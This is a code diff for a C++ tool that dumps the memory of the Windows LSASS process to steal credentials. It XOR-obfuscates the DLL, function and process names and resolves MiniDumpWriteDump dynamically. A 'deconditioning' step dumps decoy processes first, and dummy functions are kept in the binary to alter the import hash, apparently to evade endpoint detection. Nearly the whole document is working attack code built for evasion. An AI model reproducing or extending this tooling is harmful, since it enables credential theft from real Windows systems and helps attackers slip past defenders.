@@ -10,7 +10,7 @@
 #pragma comment(lib, "dbghelp.lib")
 
 
-// Change IMPhash?
+// Change imports
 
 void bla1() {
     MessageBoxA(NULL, "Hello", "World", MB_OK);
@@ -71,12 +71,12 @@ MyDumpPtr MiniDWriteD = NULL;
 
 bool resolve_func() {
     // dbghelp.dll\0
-    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
+    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AC'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
     BYTE dumpLibraryBytes[] = { 0x25,0x21,0x26,0x2b,0x24,0x2f,0x31,0x6d,0x25,0x2f,0x2d,0x43 };
     for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x43); }
 
 	// MiniDumpWriteDump\0
-    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
+    // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AC'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
     BYTE dumpFunctionBytes[] = { 0x0c,0x2a,0x2f,0x2a,0x05,0x36,0x2c,0x33,0x16,0x31,0x28,0x37,0x24,0x07,0x34,0x2e,0x31,0x43 };
     for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x43); }
 
@@ -115,6 +115,8 @@ bool dump_process(DWORD pid) {
         return false;
     }
 
+    std::cout << "  Success OpenProcess()" << std::endl;
+
     if (!MiniDWriteD(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
         std::cerr << "  Failed to create dump: " << GetLastError() << std::endl;
         CloseHandle(hFile);
@@ -132,7 +134,7 @@ bool dump_process(DWORD pid) {
 void deconditioning(unsigned int deconDumps) {
     std::vector<std::wstring> procsDump = {
         //L"ctfmon.exe", L"explorer.exe", L"ShellHost.exe", L"audiodg.exe"
-        L"conhost.exe", L"cmd.exe", L"StartMenuExperienceHost.exe", L"ctfmon.exe"
+        L"conhost.exe", L"cmd.exe", L"StartMenuExperienceHost.exe", L"ctfmon.exe"  // user processes
     };
 
     for(int i=0; i<deconDumps; i++) {
@@ -144,8 +146,8 @@ void deconditioning(unsigned int deconDumps) {
 
 
 void dump_ls4ss() {
-    // ls4ss.exe
-    // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
+    // ls4ss.exe\0
+    // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AC'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
     BYTE procBytes[] = { 0x2d,0x43,0x32,0x43,0x20,0x43,0x32,0x43,0x32,0x43,0x6f,0x43,0x24,0x43,0x39,0x43,0x24,0x43,0x41,0x43 };
     for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x43); }
     wchar_t* procW = reinterpret_cast<wchar_t*>(procBytes);
@@ -191,5 +193,12 @@ int main(int argc, char* argv[]) {
     }
 
     std::cout << "End\n";
+
+    // Make sure functions stay in
+    if (argc == 42) {
+        bla1();
+        bla2();
+    }
+
 	return 0;
 }
